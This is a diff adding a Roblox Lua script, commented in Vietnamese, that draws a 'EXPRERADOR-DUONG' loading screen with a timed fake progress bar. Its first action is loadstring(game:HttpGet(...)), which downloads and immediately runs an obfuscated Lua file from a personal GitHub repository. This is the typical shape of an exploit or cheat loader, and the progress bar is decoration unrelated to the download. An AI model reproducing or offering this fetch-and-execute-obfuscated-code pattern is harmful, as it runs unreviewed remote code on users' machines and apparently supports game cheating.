@@ -1,0 +1,105 @@
+-- Import TweenService
+local TweenService = game:GetService("TweenService")
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui", player.PlayerGui)
+
+-- Tải script từ URL ngay khi bắt đầu
+local success, errorMessage = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Duongbeta1/D-ng/refs/heads/main/obf_XP8c14xu61oMuqjq1W5apd7mU63m1XK6l9P4ZdXjpf26iNQh254V4Q9CqV11DED6.lua.txt"))()
+end)
+
+if not success then
+    warn("Có lỗi khi tải script: " .. errorMessage)
+end
+
+-- Tạo hàm hiển thị thông báo đang tải với thanh tiến trình
+local function createLoadingScreen()
+    -- Tạo khung chứa
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.3, 0) -- Chiều rộng và chiều cao là 40% và 30% so với màn hình
+    frame.Position = UDim2.new(0.3, 0, 0.35, 0) -- Ở giữa màn hình
+    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Màu đen hoàn toàn
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+    frame.ClipsDescendants = true
+
+    -- Bo cong góc
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 20) -- Bo cong 20px
+    corner.Parent = frame
+
+    -- Thêm tiêu đề "EXPRERADOR-DUONG" ở giữa
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.6, 0, 0.2, 0) -- Chiếm 20% chiều cao khung
+    title.Position = UDim2.new(0.3, 0, 0, 0) -- Nằm ở giữa phía trên menu
+    title.Text = "EXPRERADOR-DUONG"
+    title.TextColor3 = Color3.new(1, 1, 1) -- Màu chữ trắng
+    title.BackgroundTransparency = 1
+    title.TextScaled = true
+    title.Parent = frame
+
+    -- Tạo khung chứa thanh tiến trình (nền màu xám)
+    local progressBarBackground = Instance.new("Frame")
+    progressBarBackground.Size = UDim2.new(0.8, 0, 0.05, 0) -- Mỏng hơn thanh tải trước
+    progressBarBackground.Position = UDim2.new(0.1, 0, 0.8, 0) -- Nằm ở gần đáy khung
+    progressBarBackground.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Màu nền xám
+    progressBarBackground.BorderSizePixel = 0
+    progressBarBackground.Parent = frame
+
+    -- Bo cong cho nền thanh tiến trình
+    local progressBarBackgroundCorner = Instance.new("UICorner")
+    progressBarBackgroundCorner.CornerRadius = UDim.new(0, 10) -- Bo cong 10px cho nền thanh tiến trình
+    progressBarBackgroundCorner.Parent = progressBarBackground
+
+    -- Tạo thanh tiến trình (phần đã tải)
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0) -- Ban đầu thanh tiến trình trống
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 0, 139) -- Màu xanh nước biển đậm
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressBarBackground
+
+    -- Bo cong cho thanh tiến trình
+    local progressBarCorner = Instance.new("UICorner")
+    progressBarCorner.CornerRadius = UDim.new(0, 10) -- Bo cong 10px cho thanh tiến trình
+    progressBarCorner.Parent = progressBar
+
+    -- Thêm văn bản "Đang tải..." nằm trên thanh tiến trình
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, 0, 0.5, 0) -- Chiếm toàn bộ chiều rộng và một nửa chiều cao thanh tiến trình
+    loadingText.Position = UDim2.new(0, 0, -1.5, 0) -- Nằm ngay trên thanh tiến trình
+    loadingText.Text = "Đang tải..."
+    loadingText.TextColor3 = Color3.new(1, 1, 1) -- Màu chữ trắng
+    loadingText.BackgroundTransparency = 1
+    loadingText.TextScaled = true
+    loadingText.Parent = progressBar
+
+    -- Tạo hiệu ứng Tween cho thanh tiến trình (kéo dài 3 giây)
+    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear)
+    local progressTween = TweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+
+    -- Hiển thị menu và thanh tiến trình
+    frame.BackgroundTransparency = 0 -- Nền đen hoàn toàn không có độ mờ
+
+    -- Bắt đầu thanh tiến trình
+    progressTween:Play()
+
+    -- Chờ 3 giây trước khi ẩn menu
+    wait(3)
+
+    -- Hiệu ứng ẩn menu, tiêu đề và chữ "Đang tải..."
+    local fadeOutTween = TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1})
+    fadeOutTween:Play()
+    local fadeOutLoadingTextTween = TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 1})
+    fadeOutLoadingTextTween:Play()
+
+    -- Chờ cho đến khi menu và chữ biến mất
+    fadeOutTween.Completed:Wait()
+    fadeOutLoadingTextTween.Completed:Wait()
+
+    -- Xóa màn hình tải
+    frame:Destroy()
+end
+
+-- Gọi hàm tạo màn hình tải
+createLoadingScreen()
